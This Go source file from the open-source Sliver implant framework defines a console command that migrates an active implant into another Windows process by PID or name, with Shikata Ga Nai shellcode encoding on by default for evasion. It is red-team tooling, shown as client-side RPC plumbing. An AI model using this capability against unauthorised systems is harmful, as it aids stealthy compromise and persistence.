package exec

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"context"
	"fmt"

	"github.com/spf13/cobra"
	"google.golang.org/protobuf/proto"

	"github.com/bishopfox/sliver/client/console"
	"github.com/bishopfox/sliver/protobuf/clientpb"
)

// MigrateCmd - Windows only, inject an implant into another process
func MigrateCmd(cmd *cobra.Command, con *console.SliverClient, args []string) {
	session, beacon := con.ActiveTarget.GetInteractive()
	if session == nil && beacon == nil {
		return
	}

	pid, _ := cmd.Flags().GetUint32("pid")
	procName, _ := cmd.Flags().GetString("process-name")
	if pid == 0 && procName == "" {
		con.PrintErrorf("Error: Must specify either a PID or process name\n")
		return
	}

	var config *clientpb.ImplantConfig
	var implantName string

	if session != nil {
		config = con.GetActiveSessionConfig()
		implantName = session.Name
	} else {
		config = con.GetActiveBeaconConfig()
		implantName = beacon.Name
	}

	encoder := clientpb.ShellcodeEncoder_SHIKATA_GA_NAI
	if disableSgn, _ := cmd.Flags().GetBool("disable-sgn"); disableSgn {
		encoder = clientpb.ShellcodeEncoder_NONE
	}

	ctrl := make(chan bool)
	if pid != 0 {
		con.SpinUntil(fmt.Sprintf("Migrating into %d ...", pid), ctrl)
	} else {
		con.SpinUntil(fmt.Sprintf("Migrating into %s...", procName), ctrl)
	}

	migrate, err := con.Rpc.Migrate(context.Background(), &clientpb.MigrateReq{
		Pid:      pid,
		Config:   config,
		Request:  con.ActiveTarget.Request(cmd),
		Encoder:  encoder,
		Name:     implantName,
		ProcName: procName,
	})
	ctrl <- true
	<-ctrl
	if err != nil {
		con.PrintErrorf("Error: %v", err)
		return
	}
	if migrate.Response != nil && migrate.Response.Async {
		con.AddBeaconCallback(migrate.Response.TaskID, func(task *clientpb.BeaconTask) {
			err = proto.Unmarshal(task.Response, migrate)
			if err != nil {
				con.PrintErrorf("Failed to decode response %s\n", err)
			}
			if !migrate.Success {
				if migrate.GetResponse().GetErr() != "" {
					con.PrintErrorf("%s\n", migrate.GetResponse().GetErr())
				} else {
					con.PrintErrorf("Could not migrate into a new process. Check the PID or name.")
				}
				return
			}
			con.PrintInfof("Successfully migrated to %d\n", migrate.Pid)
		})
		con.PrintAsyncResponse(migrate.Response)
	} else {
		if !migrate.Success {
			if migrate.GetResponse().GetErr() != "" {
				con.PrintErrorf("%s\n", migrate.GetResponse().GetErr())
			} else {
				con.PrintErrorf("Could not migrate into a new process. Check the PID or name.")
			}
			return
		}
		con.PrintInfof("Successfully migrated to %d\n", migrate.Pid)
	}
}
